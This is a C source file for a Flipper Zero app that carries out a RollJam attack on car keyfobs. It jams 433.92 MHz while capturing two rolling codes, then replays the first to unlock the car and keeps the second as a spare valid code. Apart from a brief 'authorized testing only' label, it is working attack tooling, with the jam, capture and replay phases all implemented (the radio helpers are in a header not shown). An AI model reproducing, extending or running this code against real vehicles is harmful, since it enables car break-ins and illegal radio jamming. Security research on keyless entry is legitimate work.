// rolljam_app.c — RollJam Research for Flipper Zero
// Demonstrates rolling-code capture & replay (RollJam attack) using the
// internal CC1101 via furi_hal_subghz.
//
// Attack phases:
//   Phase 1 — Interlaced jam+RX: jam while capturing Signal A.
//             Car ignores keyfob (jammed). We record the OTA frame.
//   Phase 2 — Same: capture Signal B while continuing to jam.
//             User presses keyfob a second time (car still silent).
//   Phase 3 — Stop jamming, replay Signal A. Car opens.
//             Signal B is the attacker's "spare" valid code.
//
// Frequency: 433.92 MHz, OOK AM650
// Tested against: G4MEOVER-FW v1.0 / Momentum mntm-012 (API 87.1)
#include "rolljam_app.h"
#include "rolljam_rf.h"
#include <furi.h>
#include <gui/gui.h>
#include <gui/elements.h>
#include <input/input.h>
#include <notification/notification_messages.h>
#include <string.h>
#include <stdio.h>

// Cycle duration = jam burst + rx window
#define RJ_CYCLE_MS (ROLLJAM_JAM_BURST_MS + ROLLJAM_RX_WINDOW_MS)

// ---------------------------------------------------------------------------
// DRAW CALLBACK
// ---------------------------------------------------------------------------
static void rj_draw_cb(Canvas* canvas, void* ctx) {
    const RollJamApp* app = ctx;
    canvas_clear(canvas);

    switch(app->state) {
    case ROLLJAM_IDLE:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, "RollJam Research");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 22, "433.92 MHz  AM650 (OOK)");
        canvas_draw_str(canvas, 0, 33, "For authorized testing only.");
        elements_button_center(canvas, "Start");
        elements_button_left(canvas, "Exit");
        break;

    case ROLLJAM_PHASE1_JAMMING:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, "PHASE 1: JAM + RX");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 22, "Press keyfob once.");
        canvas_draw_str(canvas, 0, 32, "Car won't respond.");
        canvas_draw_str(canvas, 0, 44, app->status);
        elements_button_right(canvas, "Abort");
        break;

    case ROLLJAM_CAPTURED:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, "Signal A captured!");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 24, "Press keyfob again");
        canvas_draw_str(canvas, 0, 34, "for Phase 2.");
        elements_button_center(canvas, "Next");
        elements_button_right(canvas, "Abort");
        break;

    case ROLLJAM_PHASE2_JAMMING:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, "PHASE 2: JAM + RX");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 22, "Press keyfob again.");
        canvas_draw_str(canvas, 0, 32, "Car still won't open.");
        canvas_draw_str(canvas, 0, 44, app->status);
        elements_button_right(canvas, "Abort");
        break;

    case ROLLJAM_PHASE3_REPLAY:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, "PHASE 3: REPLAYING");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 22, "Sending Signal A...");
        canvas_draw_str(canvas, 0, 32, app->status);
        break;

    case ROLLJAM_DONE:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, "Done!");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 22, "Car should be open.");
        canvas_draw_str(canvas, 0, 32, "Signal B still valid.");
        elements_button_center(canvas, "Again");
        elements_button_left(canvas, "Exit");
        break;
    }
}

// ---------------------------------------------------------------------------
// INPUT CALLBACK
// ---------------------------------------------------------------------------
static void rj_input_cb(InputEvent* ev, void* ctx) {
    RollJamApp* app = ctx;
    if(ev->type != InputTypeShort) return;

    if(ev->key == InputKeyBack) {
        app->abort = true;
        return;
    }

    // Right button = abort during active phases
    if(ev->key == InputKeyRight) {
        if(app->state == ROLLJAM_PHASE1_JAMMING ||
           app->state == ROLLJAM_PHASE2_JAMMING ||
           app->state == ROLLJAM_PHASE3_REPLAY) {
            app->abort = true;
        }
        return;
    }

    if(ev->key == InputKeyOk) {
        switch(app->state) {
        case ROLLJAM_IDLE:
            app->state       = ROLLJAM_PHASE1_JAMMING;
            app->phase_start = (uint32_t)furi_get_tick();
            break;
        case ROLLJAM_CAPTURED:
            app->state       = ROLLJAM_PHASE2_JAMMING;
            app->phase_start = (uint32_t)furi_get_tick();
            break;
        case ROLLJAM_DONE:
            app->state = ROLLJAM_IDLE;
            break;
        default:
            break;
        }
    }
}

// ---------------------------------------------------------------------------
// PHASE HELPER: interlaced jam + capture
// Returns true when a valid signal has been captured, false on timeout/abort.
// ---------------------------------------------------------------------------
static bool rj_run_jam_capture_phase(
    RollJamApp* app,
    RollJamSignal* sig,
    ViewPort* vp,
    NotificationApp* notif) {

    app->phase_start = (uint32_t)furi_get_tick();
    sig->count = 0;
    sig->ready = false;
    app->rf_mode = RF_MODE_IDLE;

    while(!app->abort) {
        uint32_t elapsed = (uint32_t)furi_get_tick() - app->phase_start;

        if(elapsed >= ROLLJAM_CAPTURE_TIMEOUT_MS) {
            snprintf(app->status, sizeof(app->status), "Timeout");
            break;
        }

        // Determine desired RF mode based on cycle position
        bool want_rx = ((elapsed % RJ_CYCLE_MS) >= ROLLJAM_JAM_BURST_MS);

        if(want_rx) {
            if(app->rf_mode != RF_MODE_CAPTURING) {
                rolljam_jam_stop(app);
                rolljam_capture_start(app, sig);
            }
        } else {
            if(app->rf_mode != RF_MODE_JAMMING) {
                rolljam_capture_stop(app);
                rolljam_jam_start(app);
            }
        }

        // Update status line
        uint32_t remain_s = (ROLLJAM_CAPTURE_TIMEOUT_MS - elapsed + 999) / 1000;
        snprintf(app->status, sizeof(app->status),
                 "Listening... %lus  [%zu edges]",
                 (unsigned long)remain_s,
                 (size_t)sig->count);

        // Check if we have a complete signal
        if(rolljam_capture_done(sig)) {
            rolljam_capture_stop(app);
            rolljam_jam_stop(app);
            notification_message(notif, &sequence_success);
            snprintf(app->status, sizeof(app->status),
                     "OK  %zu edges", (size_t)sig->count);
            return true;
        }

        view_port_update(vp);
        furi_delay_ms(12);
    }

    // Clean up RF on timeout or abort
    rolljam_capture_stop(app);
    rolljam_jam_stop(app);
    return false;
}

// ---------------------------------------------------------------------------
// ENTRY POINT
// ---------------------------------------------------------------------------
int32_t rolljam_app(void* p) {
    UNUSED(p);

    RollJamApp* app = malloc(sizeof(RollJamApp));
    furi_check(app);
    memset(app, 0, sizeof(RollJamApp));

    app->state     = ROLLJAM_IDLE;
    app->frequency = ROLLJAM_FREQUENCY;
    app->modulation = "AM650 (OOK)";
    app->abort     = false;
    app->rf_mode   = RF_MODE_IDLE;
    strncpy(app->status, "Ready", sizeof(app->status) - 1);

    rolljam_rf_init(app);

    // GUI
    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, rj_draw_cb, app);
    view_port_input_callback_set(vp, rj_input_cb, app);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);
    NotificationApp* notif = furi_record_open(RECORD_NOTIFICATION);

    // -----------------------------------------------------------------------
    // MAIN LOOP
    // -----------------------------------------------------------------------
    while(!app->abort) {
        switch(app->state) {

        // -------- IDLE --------
        case ROLLJAM_IDLE:
            view_port_update(vp);
            furi_delay_ms(50);
            break;

        // -------- PHASE 1: jam + capture Signal A --------
        case ROLLJAM_PHASE1_JAMMING: {
            bool captured = rj_run_jam_capture_phase(app, &app->signal_a, vp, notif);
            if(app->abort) break;
            app->state = captured ? ROLLJAM_CAPTURED : ROLLJAM_IDLE;
            view_port_update(vp);
            break;
        }

        // -------- CAPTURED: wait for user to proceed --------
        case ROLLJAM_CAPTURED:
            view_port_update(vp);
            furi_delay_ms(50);
            break;

        // -------- PHASE 2: jam + capture Signal B --------
        case ROLLJAM_PHASE2_JAMMING: {
            bool captured = rj_run_jam_capture_phase(app, &app->signal_b, vp, notif);
            if(app->abort) break;
            // Proceed to replay even if Signal B capture timed out —
            // Signal A is what unlocks the car.
            if(!captured) {
                snprintf(app->status, sizeof(app->status), "B skipped — replaying A");
            }
            app->state = ROLLJAM_PHASE3_REPLAY;
            view_port_update(vp);
            break;
        }

        // -------- PHASE 3: replay Signal A --------
        case ROLLJAM_PHASE3_REPLAY: {
            if(app->signal_a.count < ROLLJAM_MIN_EDGES) {
                snprintf(app->status, sizeof(app->status), "No signal to replay");
                app->state = ROLLJAM_IDLE;
                view_port_update(vp);
                break;
            }

            rolljam_replay_start(app);
            snprintf(app->status, sizeof(app->status), "Sending...");
            view_port_update(vp);

            // Wait for replay to finish (or abort)
            while(!app->abort && !rolljam_replay_done(app)) {
                snprintf(app->status, sizeof(app->status),
                         "TX %zu / %zu",
                         (size_t)app->tx_pos,
                         (size_t)app->signal_a.count);
                view_port_update(vp);
                furi_delay_ms(20);
            }

            rolljam_replay_stop(app);
            if(!app->abort) {
                notification_message(notif, &sequence_success);
                app->state = ROLLJAM_DONE;
            }
            view_port_update(vp);
            break;
        }

        // -------- DONE --------
        case ROLLJAM_DONE:
            view_port_update(vp);
            furi_delay_ms(50);
            break;
        }
    }

    // -----------------------------------------------------------------------
    // CLEANUP
    // -----------------------------------------------------------------------
    rolljam_rf_deinit(app);
    gui_remove_view_port(gui, vp);
    view_port_free(vp);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    free(app);
    return 0;
}
